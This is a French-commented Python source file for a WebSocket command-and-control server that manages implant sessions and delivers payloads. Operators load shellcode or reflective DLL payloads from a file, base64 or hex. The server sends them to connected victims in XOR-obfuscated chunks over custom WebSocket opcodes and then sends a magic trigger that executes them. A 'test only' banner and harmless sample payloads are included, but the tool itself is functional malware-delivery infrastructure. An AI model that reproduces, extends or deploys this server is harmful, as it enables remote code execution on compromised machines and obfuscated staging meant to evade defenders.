#!/usr/bin/env python3
"""
C2 Server pour client WebSocket
Usage:
    ./c2.py --listen 0.0.0.0:34847
    
Commandes interactives:
    upload <fichier>              - Charger un payload depuis un fichier
    upload --base64 <string>      - Charger un payload en base64
    upload --hex <string>         - Charger un payload en hexadécimal
    sessions                      - Lister les sessions actives
    run <session_id>              - Envoyer et exécuter le payload
    trigger <session_id>          - Envoyer seulement le trigger
    info                          - Infos sur le payload chargé
    clear                         - Effacer le payload
    help                          - Aide
    exit                          - Quitter
"""

import socket
import struct
import hashlib
import time
import sys
import os
import base64
import threading
import argparse
# import readline  # Pour l'historique des commandes
from datetime import datetime

# ============== CONFIGURATION ==============
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 30944
CHUNK_SIZE = 8192
XOR_KEY = 0x42

# ============== MAGIC NUMBERS ==============
CHUNK_MAGIC_INIT  = 0xCAFEBABE
CHUNK_MAGIC_DATA  = 0xDEADC0DE
CHUNK_MAGIC_FINAL = 0xBAADF00D

# ============== PAYLOAD TYPES ============== # ← AJOUTER CETTE SECTION
PAYLOAD_TYPE_AUTO       = 0x00
PAYLOAD_TYPE_SHELLCODE  = 0x01
PAYLOAD_TYPE_REFLECTIVE = 0x02

# Signatures PE
PE_DOS_SIGNATURE = b'MZ'
PE_NT_SIGNATURE  = b'PE\x00\x00'

# ============== TRIGGER MAGIC ==============
TRIGGER_MAGIC = bytes([
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x13, 0x37, 0xC0, 0xDE, 0xDE, 0xAD, 0xBE, 0xEF,
    0xCA, 0xFE, 0xBA, 0xBE, 0x13, 0x37, 0xC0, 0xDE,
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE
])

# ============== COULEURS TERMINAL ==============
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def log_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[-]{Colors.END} {msg}")

def log_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

# ============== SESSION MANAGER ==============
class Session:
    def __init__(self, socket, address, session_id=None):
        self.socket = socket
        self.address = address
        self.session_id = session_id
        self.connected_at = datetime.now()
        self.last_activity = datetime.now()
        self.payload_sent = False
        self.triggered = False
    
    def __str__(self):
        duration = datetime.now() - self.connected_at
        status = "TRIGGERED" if self.triggered else ("LOADED" if self.payload_sent else "WAITING")
        return f"{self.address[0]}:{self.address[1]} - {status} - connecté depuis {duration.seconds}s"

class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.session_counter = 0
        self.lock = threading.Lock()
    
    def add(self, socket, address):
        with self.lock:
            session_id = self.session_counter
            self.sessions[session_id] = Session(socket, address, session_id)
            self.session_counter += 1
            return session_id
    
    def remove(self, session_id):
        with self.lock:
            if session_id in self.sessions:
                try:
                    self.sessions[session_id].socket.close()
                except:
                    pass
                del self.sessions[session_id]
    
    def get(self, session_id):
        with self.lock:
            return self.sessions.get(session_id)
    
    def list_all(self):
        with self.lock:
            return [(sid, str(sess)) for sid, sess in self.sessions.items()]

# ============== PAYLOAD MANAGER ==============
class PayloadManager:
    def __init__(self):
        self.payload = None
        self.source = None
        self.hash = None
        self.payload_type = PAYLOAD_TYPE_AUTO      # ← NOUVEAU
        self.detected_type = PAYLOAD_TYPE_AUTO     # ← NOUVEAU
        self.type_forced = False                   # ← NOUVEAU
        self.lock = threading.Lock()
    
    def _detect_type(self):
        """Détecte automatiquement le type de payload"""
        if not self.payload or len(self.payload) < 64:
            return PAYLOAD_TYPE_SHELLCODE
        
        # Vérifier signature PE "MZ"
        if self.payload[:2] == PE_DOS_SIGNATURE:
            # C'est un PE, vérifier si c'est une DLL reflective
            try:
                # Lire e_lfanew (offset vers PE header)
                e_lfanew = struct.unpack('<I', self.payload[0x3C:0x40])[0]
                
                if e_lfanew + 4 <= len(self.payload):
                    # Vérifier signature "PE\0\0"
                    if self.payload[e_lfanew:e_lfanew+4] == PE_NT_SIGNATURE:
                        # C'est un PE valide → probablement reflective
                        return PAYLOAD_TYPE_REFLECTIVE
            except:
                pass
            
            # PE mais pas valide → traiter comme shellcode avec stub
            return PAYLOAD_TYPE_REFLECTIVE
        
        # Pas de signature PE → shellcode brut
        return PAYLOAD_TYPE_SHELLCODE
    
    def _get_type_name(self, type_code):
        """Retourne le nom lisible du type"""
        names = {
            PAYLOAD_TYPE_AUTO: "AUTO",
            PAYLOAD_TYPE_SHELLCODE: "SHELLCODE",
            PAYLOAD_TYPE_REFLECTIVE: "REFLECTIVE"
        }
        return names.get(type_code, "UNKNOWN")
    
    def load_file(self, filepath):
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"Fichier non trouvé: {filepath}")
        
        with self.lock:
            with open(filepath, 'rb') as f:
                self.payload = f.read()
            
            self.source = f"file:{filepath}"
            self.hash = hashlib.sha256(self.payload).hexdigest()
            
            # ← NOUVEAU: Détection automatique
            self.detected_type = self._detect_type()
            if not self.type_forced:
                self.payload_type = self.detected_type
            
            return len(self.payload)
    
    def load_base64(self, b64_string):
        b64_clean = b64_string.replace(' ', '').replace('\n', '').replace('\r', '')
        
        try:
            decoded = base64.b64decode(b64_clean)
        except Exception as e:
            raise ValueError(f"Base64 invalide: {e}")
        
        with self.lock:
            self.payload = decoded
            self.source = "base64"
            self.hash = hashlib.sha256(self.payload).hexdigest()
            
            # ← NOUVEAU: Détection automatique
            self.detected_type = self._detect_type()
            if not self.type_forced:
                self.payload_type = self.detected_type
            
            return len(self.payload)
    
    def load_hex(self, hex_string):
        hex_clean = hex_string.replace(' ', '').replace('\n', '').replace('\\x', '').replace('0x', '')
        hex_clean = ''.join(c for c in hex_clean if c in '0123456789abcdefABCDEF')

        if len(hex_clean) % 2 != 0:
            raise ValueError("Longueur hexadécimale invalide (doit être paire)")

        try:
            decoded = bytes.fromhex(hex_clean)
        except Exception as e:
            raise ValueError(f"Hex invalide: {e}")
        
        with self.lock:
            self.payload = decoded
            self.source = "hex"
            self.hash = hashlib.sha256(self.payload).hexdigest()
            
            # ← NOUVEAU: Détection automatique
            self.detected_type = self._detect_type()
            if not self.type_forced:
                self.payload_type = self.detected_type
            
            return len(self.payload)
    
    def set_type(self, type_code):
        """Force un type de payload"""
        with self.lock:
            self.payload_type = type_code
            self.type_forced = True
    
    def reset_type(self):
        """Remet la détection automatique"""
        with self.lock:
            self.type_forced = False
            if self.payload:
                self.payload_type = self.detected_type
    
    def clear(self):
        with self.lock:
            self.payload = None
            self.source = None
            self.hash = None
            self.payload_type = PAYLOAD_TYPE_AUTO
            self.detected_type = PAYLOAD_TYPE_AUTO
            self.type_forced = False
    
    def info(self):
        if not self.payload:
            return None
        
        return {
            'size': len(self.payload),
            'source': self.source,
            'hash': self.hash,
            'preview': self.payload[:32].hex(),
            'type': self.payload_type,                              # ← NOUVEAU
            'type_name': self._get_type_name(self.payload_type),    # ← NOUVEAU
            'detected': self._get_type_name(self.detected_type),    # ← NOUVEAU
            'forced': self.type_forced                              # ← NOUVEAU
        }

# ============== WEBSOCKET FUNCTIONS ==============
def rotate_xor_key(xor_base: int, state: int) -> int:
    """Calcule la clé XOR rotative"""
    return ((xor_base * 7 + state) % 251) | 1

def create_ws_frame(opcode: int, payload: bytes) -> bytes:
    """Crée une frame WebSocket avec opcode personnalisé"""
    frame = bytearray()
    
    # Byte 0: FIN=1, RSV=000, OPCODE
    frame.append(0x80 | (opcode & 0x0F))
    
    # Byte 1+: Length
    payload_len = len(payload)
    
    if payload_len <= 125:
        frame.append(payload_len)
    elif payload_len <= 65535:
        frame.append(126)
        frame.extend(struct.pack('>H', payload_len))
    else:
        frame.append(127)
        frame.extend(struct.pack('>Q', payload_len))
    
    frame.extend(payload)
    return bytes(frame)

def do_handshake(client_socket):
    """Effectue le handshake WebSocket"""
    try:
        request = client_socket.recv(4096).decode('utf-8', errors='ignore')
        
        # Extraire Sec-WebSocket-Key
        key = None
        for line in request.split('\r\n'):
            if line.lower().startswith('sec-websocket-key:'):
                key = line.split(':', 1)[1].strip()
                break
        
        if not key:
            return False
        
        # Calculer Sec-WebSocket-Accept
        GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
        accept = base64.b64encode(
            hashlib.sha1((key + GUID).encode()).digest()
        ).decode()
        
        # Réponse handshake
        response = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept}\r\n"
            "\r\n"
        )
        
        client_socket.send(response.encode())
        return True
        
    except Exception as e:
        log_error(f"Handshake error: {e}")
        return False

def send_payload(session: Session, payload: bytes, xor_key: int = XOR_KEY, payload_type: int = PAYLOAD_TYPE_AUTO):
    """Envoie le payload complet à une session"""
    sock = session.socket
    
    try:
        # Hash original pour vérification
        original_hash = hashlib.sha256(payload).digest()
        
        # ===== INIT (opcode 0x04) =====
        # Format: magic(4) + size(8) + xor_key(1) + payload_type(1) + reserved(2)
        init_payload = struct.pack('<I', CHUNK_MAGIC_INIT)
        init_payload += struct.pack('<Q', len(payload))
        init_payload += struct.pack('<B', xor_key)
        init_payload += struct.pack('<B', payload_type)  # ← NOUVEAU: Type de payload
        init_payload += b'\x00\x00'                       # ← MODIFIÉ: 2 bytes réservés
        
        frame = create_ws_frame(0x04, init_payload)
        sock.send(frame)
        
        type_name = {PAYLOAD_TYPE_AUTO: "AUTO", PAYLOAD_TYPE_SHELLCODE: "SHELLCODE", PAYLOAD_TYPE_REFLECTIVE: "REFLECTIVE"}.get(payload_type, "UNKNOWN")
        log_info(f"INIT envoyé: size={len(payload)}, xor_key={xor_key:#x}, type={type_name}")
        time.sleep(0.3)
        
        # ===== DATA chunks (opcode 0x03) =====
        state = 0
        offset = 0
        chunk_num = 0
        
        while offset < len(payload):
            chunk = payload[offset:offset + CHUNK_SIZE]
            
            # Chiffrer avec XOR rotatif
            encrypted = bytearray(len(chunk))
            for i, byte in enumerate(chunk):
                key = rotate_xor_key(xor_key, state)
                encrypted[i] = byte ^ key
                state = (state + 1) & 0xFF
            
            # Construire et envoyer
            data_payload = struct.pack('<I', CHUNK_MAGIC_DATA) + bytes(encrypted)
            frame = create_ws_frame(0x03, data_payload)
            sock.send(frame)
            
            log_info(f"DATA chunk {chunk_num}: {len(chunk)} bytes (offset {offset})")
            
            offset += len(chunk)
            chunk_num += 1
            time.sleep(0.15)
        
        # ===== FINAL (opcode 0x05) =====
        final_payload = struct.pack('<I', CHUNK_MAGIC_FINAL) + original_hash
        frame = create_ws_frame(0x05, final_payload)
        sock.send(frame)
        log_info(f"FINAL envoyé: hash={original_hash.hex()[:16]}...")
        
        session.payload_sent = True
        session.last_activity = datetime.now()
        
        return True, None
        
    except Exception as e:
        log_error(f"Erreur envoi payload: {e}")
        return False,  session.session_id

def send_trigger(session: Session):
    """Envoie le signal de trigger"""
    sock = session.socket
    
    try:
        # Construire le trigger (72 bytes)
        trigger = bytearray(TRIGGER_MAGIC)
        trigger += struct.pack('<Q', int(time.time()))
        trigger += hashlib.sha256(bytes(trigger)).digest()
        
        assert len(trigger) == 72
        
        frame = create_ws_frame(0x02, bytes(trigger))
        sock.send(frame)
        
        session.triggered = True
        session.last_activity = datetime.now()
        
        log_success("TRIGGER envoyé!")
        return True, None
        
    except Exception as e:
        log_error(f"Erreur envoi trigger: {e}")
        return False, session.session_id

# ============== SERVER ==============
class C2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sessions = SessionManager()
        self.payload = PayloadManager()
        self.running = False
        self.server_socket = None
        self.accept_thread = None
    
    def start(self):
        """Démarre le serveur en arrière-plan"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.running = True
        
        self.accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        self.accept_thread.start()
        
        log_success(f"Serveur démarré sur {self.host}:{self.port}")
    
    def _accept_loop(self):
        """Boucle d'acceptation des connexions"""
        while self.running:
            try:
                self.server_socket.settimeout(1.0)
                client, addr = self.server_socket.accept()
                
                # Handshake dans un thread séparé
                thread = threading.Thread(
                    target=self._handle_client, 
                    args=(client, addr),
                    daemon=True
                )
                thread.start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    log_error(f"Accept error: {e}")
    
    def _handle_client(self, client, addr):
        """Gère une nouvelle connexion"""
        log_info(f"Nouvelle connexion de {addr[0]}:{addr[1]}")
        
        if do_handshake(client):
            session_id = self.sessions.add(client, addr)
            log_success(f"Session {session_id} établie avec {addr[0]}:{addr[1]}")
        else:
            log_error(f"Handshake échoué avec {addr[0]}:{addr[1]}")
            client.close()
    
    def stop(self):
        """Arrête le serveur"""
        self.running = False
        # Fermer toutes les sessions
        with self.sessions.lock:
            for sess in list(self.sessions.sessions.values()):
                try:
                    sess.socket.close()
                except:
                    pass
            self.sessions.sessions.clear()
    # Fermer le socket serveur
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass

# ============== CLI INTERFACE ==============
def print_banner():
    banner = f"""
{Colors.RED}
   ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
  ██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
  ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
  ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
  ╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
   ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
{Colors.END}
{Colors.CYAN}  WebSocket C2 Server - Pour test uniquement{Colors.END}
"""
    print(banner)

def print_help():
    help_text = f"""
{Colors.BOLD}Commandes disponibles:{Colors.END}

  {Colors.YELLOW}upload <fichier>{Colors.END}
      Charger un payload depuis un fichier (.bin, .dll, .shellcode)
      
  {Colors.YELLOW}upload --base64 <string>{Colors.END}
      Charger un payload encodé en base64
      
  {Colors.YELLOW}upload --hex <string>{Colors.END}
      Charger un payload en hexadécimal (\\x90\\x90 ou 9090)
      
  {Colors.YELLOW}type [shellcode|reflective|auto]{Colors.END}
      Forcer le type de payload ou remettre en auto-détection
      
  {Colors.YELLOW}sessions{Colors.END}
      Lister toutes les sessions actives
      
  {Colors.YELLOW}run <session_id>{Colors.END}
      Envoyer le payload ET le trigger à une session
      
  {Colors.YELLOW}send <session_id>{Colors.END}
      Envoyer seulement le payload (sans trigger)
      
  {Colors.YELLOW}trigger <session_id>{Colors.END}
      Envoyer seulement le trigger (payload doit être envoyé avant)
      
  {Colors.YELLOW}info{Colors.END}
      Afficher les informations du payload chargé
      
  {Colors.YELLOW}clear{Colors.END}
      Effacer le payload chargé
      
  {Colors.YELLOW}generate [shellcode|reflective]{Colors.END}
      Générer un payload de test
      
  {Colors.YELLOW}help{Colors.END}
      Afficher cette aide
      
  {Colors.YELLOW}exit{Colors.END}
      Quitter le programme
"""
    print(help_text)

def interactive_cli(server: C2Server):
    """Interface en ligne de commande interactive"""
    
    while True:
        try:
            # Prompt avec info session
            session_count = len(server.sessions.sessions)
            payload_status = "✓" if server.payload.payload else "✗"
            
            prompt = f"{Colors.RED}C2{Colors.END}"
            prompt += f" [{Colors.GREEN}{session_count} sessions{Colors.END}]"
            prompt += f" [{Colors.YELLOW}payload:{payload_status}{Colors.END}]"
            prompt += f" > "
            
            cmd = input(prompt).strip()
            
            if not cmd:
                continue
            
            parts = cmd.split(maxsplit=2)
            command = parts[0].lower()
            
            # ===== UPLOAD =====
            if command == "upload":
                if len(parts) < 2:
                    log_error("Usage: upload <fichier> | upload --base64 <string> | upload --hex <string>")
                    continue
                
                try:
                    if parts[1] == "--base64" and len(parts) >= 3:
                        size = server.payload.load_base64(parts[2])
                        log_success(f"Payload base64 chargé: {size} bytes")
                    
                    elif parts[1] == "--hex" and len(parts) >= 3:
                        size = server.payload.load_hex(parts[2])
                        log_success(f"Payload hex chargé: {size} bytes")
                    
                    else:
                        filepath = parts[1]
                        size = server.payload.load_file(filepath)
                        log_success(f"Payload fichier chargé: {size} bytes")
                    
                    info = server.payload.info()
                    log_info(f"SHA256: {info['hash'][:32]}...")
                    log_info(f"Preview: {info['preview']}")
                    
                    # ← NOUVEAU: Afficher le type détecté
                    type_color = Colors.CYAN if info['type_name'] == 'SHELLCODE' else Colors.PURPLE
                    log_info(f"Type détecté: {type_color}{info['type_name']}{Colors.END}")
                    
                except Exception as e:
                    log_error(str(e))
            
             # ===== TYPE =====
            elif command == "type":
                if len(parts) < 2:
                    # Afficher le type actuel
                    if server.payload.payload:
                        info = server.payload.info()
                        forced_str = " (forcé)" if info['forced'] else " (auto)"
                        log_info(f"Type actuel: {info['type_name']}{forced_str}")
                        log_info(f"Type détecté: {info['detected']}")
                    else:
                        log_warning("Aucun payload chargé")
                    continue
                
                type_arg = parts[1].lower()
                
                if type_arg == "shellcode":
                    server.payload.set_type(PAYLOAD_TYPE_SHELLCODE)
                    log_success("Type forcé: SHELLCODE")
                elif type_arg == "reflective":
                    server.payload.set_type(PAYLOAD_TYPE_REFLECTIVE)
                    log_success("Type forcé: REFLECTIVE")
                elif type_arg == "auto":
                    server.payload.reset_type()
                    if server.payload.payload:
                        info = server.payload.info()
                        log_success(f"Type auto: {info['type_name']}")
                    else:
                        log_success("Type remis en auto-détection")
                else:
                    log_error("Usage: type [shellcode|reflective|auto]")
            # ===== SESSIONS =====
            elif command == "sessions":
                sessions = server.sessions.list_all()
                if not sessions:
                    log_warning("Aucune session active")
                else:
                    print(f"\n{Colors.BOLD}Sessions actives:{Colors.END}")
                    for sid, info in sessions:
                        print(f"  [{sid}] {info}")
                    print()
            
            # ===== RUN (send + trigger) =====
            elif command == "run":
                if len(parts) < 2:
                    log_error("Usage: run <session_id>")
                    continue
                
                if not server.payload.payload:
                    log_error("Aucun payload chargé! Utilisez 'upload' d'abord.")
                    continue
                
                try:
                    session_id = int(parts[1])
                    session = server.sessions.get(session_id)
                    
                    if not session:
                        log_error(f"Session {session_id} non trouvée")
                        continue
                    
                    # ← NOUVEAU: Afficher le type
                    info = server.payload.info()
                    log_info(f"Envoi du payload à session {session_id} (type={info['type_name']})...")
                    
                    # ← MODIFIÉ: Passer le type
                    success, dead_id = send_payload(session, server.payload.payload,
                                                    XOR_KEY, server.payload.payload_type)
                    if success:
                        log_success("Payload envoyé!")
                        time.sleep(0.5)
                        
                        log_info("Envoi du trigger...")
                        success, dead_id = send_trigger(session)
                        if success:
                            log_success(f"Payload exécuté sur session {session_id}!")
                        else:
                            log_error("Échec envoi trigger")
                            if dead_id is not None:
                                server.sessions.remove(dead_id)
                                log_warning(f"Session {dead_id} supprimée (déconnectée)")
                    else:
                        log_error("Échec envoi payload")
                        if dead_id is not None:
                            server.sessions.remove(dead_id)
                            log_warning(f"Session {dead_id} supprimée (déconnectée)")
                        
                except ValueError:
                    log_error("session_id doit être un nombre")
            
            # ===== SEND (payload only) =====
            elif command == "send":
                if len(parts) < 2:
                    log_error("Usage: send <session_id>")
                    continue
                
                if not server.payload.payload:
                    log_error("Aucun payload chargé!")
                    continue
                
                try:
                    session_id = int(parts[1])
                    session = server.sessions.get(session_id)
                    
                    if not session:
                        log_error(f"Session {session_id} non trouvée")
                        continue
                    
                    # ✅ CORRIGÉ: Passer le type
                    success, dead_id = send_payload(session, server.payload.payload,
                                                    XOR_KEY, server.payload.payload_type)
                    if success:
                        log_success(f"Payload envoyé à session {session_id}")
                    else:
                        log_error("Échec envoi payload")
                        if dead_id is not None:
                            server.sessions.remove(dead_id)
                            log_warning(f"Session {dead_id} supprimée (déconnectée)")
                        
                except ValueError:
                    log_error("session_id doit être un nombre")
            
            # ===== TRIGGER =====
            elif command == "trigger":
                if len(parts) < 2:
                    log_error("Usage: trigger <session_id>")
                    continue
                
                try:
                    session_id = int(parts[1])
                    session = server.sessions.get(session_id)
                    
                    if not session:
                        log_error(f"Session {session_id} non trouvée")
                        continue
                    
                    if not session.payload_sent:
                        log_warning("Attention: payload non envoyé à cette session!")
                    
                    success, dead_id = send_trigger(session)
                    if success:
                        log_success(f"Trigger envoyé à session {session_id}")
                    else:
                        log_error("Échec envoi trigger")
                        if dead_id is not None:
                            server.sessions.remove(dead_id)
                            log_warning(f"Session {dead_id} supprimée (déconnectée)")
                        
                except ValueError:
                    log_error("session_id doit être un nombre")
            
            # ===== INFO =====
            elif command == "info":
                info = server.payload.info()
                if not info:
                    log_warning("Aucun payload chargé")
                else:
                    print(f"\n{Colors.BOLD}Payload Info:{Colors.END}")
                    print(f"  Source:   {info['source']}")
                    print(f"  Size:     {info['size']} bytes")
                    print(f"  SHA256:   {info['hash']}")
                    print(f"  Preview:  {info['preview']}")
                    
                    # ← NOUVEAU: Afficher le type
                    type_color = Colors.CYAN if info['type_name'] == 'SHELLCODE' else Colors.PURPLE
                    forced_str = f" {Colors.YELLOW}(forcé){Colors.END}" if info['forced'] else ""
                    print(f"  Type:     {type_color}{info['type_name']}{Colors.END}{forced_str}")
                    print(f"  Détecté:  {info['detected']}")
                    print()
            
            # ===== CLEAR =====
            elif command == "clear":
                server.payload.clear()
                log_success("Payload effacé")
            
            # ===== GENERATE =====
            elif command == "generate":
                gen_type = "shellcode"
                if len(parts) >= 2:
                    gen_type = parts[1].lower()
                
                if gen_type == "shellcode":
                    # Générer un shellcode de test (NOP sled + INT3 + RET)
                    test_payload = b'\x90' * 100  # NOPs
                    test_payload += b'\xCC'        # INT3 (breakpoint)
                    test_payload += b'\xC3'        # RET
                    
                    server.payload.payload = test_payload
                    server.payload.source = "generated:shellcode"
                    server.payload.hash = hashlib.sha256(test_payload).hexdigest()
                    server.payload.detected_type = PAYLOAD_TYPE_SHELLCODE
                    server.payload.payload_type = PAYLOAD_TYPE_SHELLCODE
                    server.payload.type_forced = False
                    
                    log_success(f"Shellcode de test généré: {len(test_payload)} bytes")
                    log_info("Ce payload va faire un breakpoint (INT3)")
                    
                elif gen_type == "reflective":
                    # Générer un faux PE pour test (header MZ minimal + NOPs)
                    # Ceci est juste pour tester la détection, pas un vrai PE!
                    test_payload = b'MZ' + b'\x00' * 58  # DOS header minimal
                    test_payload += struct.pack('<I', 64)  # e_lfanew = 64
                    test_payload += b'PE\x00\x00'  # PE signature
                    test_payload += b'\x90' * 100  # NOPs
                    test_payload += b'\xCC\xC3'    # INT3 + RET
                    
                    server.payload.payload = test_payload
                    server.payload.source = "generated:reflective"
                    server.payload.hash = hashlib.sha256(test_payload).hexdigest()
                    server.payload.detected_type = PAYLOAD_TYPE_REFLECTIVE
                    server.payload.payload_type = PAYLOAD_TYPE_REFLECTIVE
                    server.payload.type_forced = False
                    
                    log_success(f"Faux PE reflective généré: {len(test_payload)} bytes")
                    log_warning("Ceci est un FAUX PE pour test de détection uniquement!")
                    
                else:
                    log_error("Usage: generate [shellcode|reflective]")
            
            # ===== HELP =====
            elif command == "help":
                print_help()
            
            # ===== EXIT =====
            elif command in ["exit", "quit", "q"]:
                log_info("Arrêt du serveur...")
                server.stop()
                break
            
            else:
                log_error(f"Commande inconnue: {command}")
                log_info("Tapez 'help' pour voir les commandes disponibles")
        
        except KeyboardInterrupt:
            print()
            log_info("Ctrl+C détecté. Tapez 'exit' pour quitter.")
        
        except EOFError:
            break
        
        except Exception as e:
            log_error(f"Erreur: {e}")

# ============== MAIN ==============
def main():
    parser = argparse.ArgumentParser(description='C2 WebSocket Server')
    parser.add_argument('--listen', '-l', 
                        default=f"{DEFAULT_HOST}:{DEFAULT_PORT}",
                        help=f'Adresse d\'écoute (default: {DEFAULT_HOST}:{DEFAULT_PORT})')
    parser.add_argument('--upload', '-u',
                        help='Charger un payload au démarrage')
    parser.add_argument('--base64', '-b',
                        help='Charger un payload base64 au démarrage')
    
    args = parser.parse_args()
    
    # Parser host:port
    try:
        if ':' in args.listen:
            host, port = args.listen.rsplit(':', 1)
            port = int(port)
        else:
            host = args.listen
            port = DEFAULT_PORT
    except:
        host = DEFAULT_HOST
        port = DEFAULT_PORT
    
    print_banner()
    
    # Créer et démarrer le serveur
    server = C2Server(host, port)
    server.start()
    
    # Charger un payload si spécifié
    if args.upload:
        try:
            size = server.payload.load_file(args.upload)
            log_success(f"Payload chargé: {size} bytes")
        except Exception as e:
            log_error(f"Erreur chargement: {e}")
    
    if args.base64:
        try:
            size = server.payload.load_base64(args.base64)
            log_success(f"Payload base64 chargé: {size} bytes")
        except Exception as e:
            log_error(f"Erreur décodage: {e}")
    
    # Lancer l'interface interactive
    interactive_cli(server)
    
    log_info("Au revoir!")

if __name__ == "__main__":
    main()